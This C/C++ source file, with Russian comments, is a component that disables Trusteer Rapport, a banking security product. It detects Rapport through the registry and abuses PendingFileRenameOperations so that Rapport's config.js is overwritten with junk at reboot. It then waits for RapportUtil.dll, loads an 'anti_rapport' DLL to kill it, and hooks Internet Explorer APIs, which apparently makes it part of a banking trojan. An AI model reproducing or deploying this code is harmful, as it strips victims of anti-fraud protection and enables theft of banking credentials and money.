#include "antirapport.h"

/*
проверяю установлин ли рапорт
в ветке
SOFTWARE\Trusteer\Rapport
так
RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'SOFTWARE\Trusteer\Rapport',0,$0001,reg) = 0;


если он установлен то делается так
1 создаетя файл с мусором например так %appdata%\1.txt

затем записуеш в реестр следующие
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager
PendingFileRenameOperations

\??\%appdata%\1.txt!\??\%Program Files%\Trusteer\Rapport\js\config.js

%appdata% и %Program Files% заменяются соотвецтвенно.
например
\??\C:\Users\user\AppData\1.txt!\??\C:\Program Files\Trusteer\Rapport\js\config.js
после ребуда конфиг рапорта заменяется мусором и рапорт есть но не-знает чего ему делать
*/
bool RapportOldKill()
{
	HKEY hkey = 0;
	LONG err = (LONG)pRegOpenKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Trusteer\\Rapport", 0, KEY_WRITE, &hkey);
	if ( err == ERROR_SUCCESS )
	{
		pRegCloseKey(hkey);
		WCHAR SysPath1[MAX_PATH];
		
		WCHAR ExplorerAdd[]={'\\','1','.','t','x','t',L'\0'};
		pSHGetFolderPathW(NULL,  0x001a, NULL, 0, SysPath1);	
		plstrcatW( SysPath1, ExplorerAdd );
		
		HANDLE hLog = (HANDLE)pCreateFileW( SysPath1, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
		if (hLog==NULL)return  false;
		DWORD dwWritten = 0;
		for(int i=0 ;i<20;i++)
		{
			pWriteFile( hLog, "123456789012345678901234567890", 30, &dwWritten, 0 );
			pWriteFile( hLog, "\r\n", 2, &dwWritten, 0 );
		}
		CloseHandle(hLog);
		
		WCHAR SysProgrFil[MAX_PATH];
		pSHGetFolderPathW(NULL,  0x0026, NULL, 0, SysProgrFil);	
		plstrcatW( SysProgrFil,L"\\Trusteer\\Rapport\\js\\config.js" );
														  
		//plstrcatW( SysPath1, SysProgrFil );	
		WCHAR ALLSysProgrFil[MAX_PATH*2];
		ALLSysProgrFil[0]=L'\0';

		plstrcpyW(ALLSysProgrFil,L"\\??\\");
		plstrcatW( ALLSysProgrFil, SysPath1 );	
		
		//m_memcpy(&ALLSysProgrFil[(int)plstrlenW(ALLSysProgrFil)],L"\0\0\0\0\\??\\",8*2 );
		//m_memcpy(&ALLSysProgrFil[(int)plstrlenW(ALLSysProgrFil)+8],SysProgrFil,(int)plstrlenW(SysProgrFil)*2 );
		plstrcatW( ALLSysProgrFil, L"\r\n!\\??\\" );	
		plstrcatW( ALLSysProgrFil, SysProgrFil );	
		
		

	
		//Registry::CreateValueString(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Session Manager","PendingFileRenameOperations",ToAnsi(ALLSysProgrFil));
		Registry::CreateValueREGMULTI_SZ(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Session Manager","PendingFileRenameOperations",ToAnsi(ALLSysProgrFil),(DWORD)plstrlenW(ALLSysProgrFil));//((int)plstrlenW(SysProgrFil)+(int)plstrlenW(SysPath1)+8)*2);
		return true;
	}
	return  false;
}

DWORD WINAPI RapportWaitThread( LPVOID lpParam ) 
{
	OutputDebugStr("Rapport wait thread.");

	HMODULE hRapportModule = 0;
	while (0 == hRapportModule)
	{
		OutputDebugStr("wait cycle...");
		Sleep(500);
		hRapportModule = GetModuleHandle("RapportUtil.dll");
		DWORD err=GetLastError();
		DbgMsg("wait cycle...%d",err,"");
	//	OutputDebugStringA("wait cycle...%d",err );
	}
	OutputDebugStr("Rapport has been found! Trying to kill...");

	HMODULE hDll = LoadLibrary("C:\\anti_rapport_dll.dll");
	if (0 == hDll)
	{
		OutputDebugStr("Dll loading failed.");
	}
	else
	{
		typedef void (__cdecl *FUNC)(void);
		FUNC pFunc = (FUNC)GetProcAddress(hDll, "_Initialize@0");
		if (pFunc)
		{
			pFunc();
		}
		else
		{
			OutputDebugStr("GetProc failed!");
		}
	}


	if ( HookInternetExplorerApi() )
	{
		return 0;
	}

    
  return 0; 
} 


void StartRapportWaitThread()
{
	int Data_Of_Thread = 0;
	HANDLE Handle_Of_Thread = 0;

  Handle_Of_Thread = CreateThread( NULL, 0,  RapportWaitThread, &Data_Of_Thread, 0, NULL);  
  if (NULL == Handle_Of_Thread)
		OutputDebugStr("Thread start failed");
	else
	{
		OutputDebugStr("Thread has been started!");
		CloseHandle(Handle_Of_Thread);
	}
}
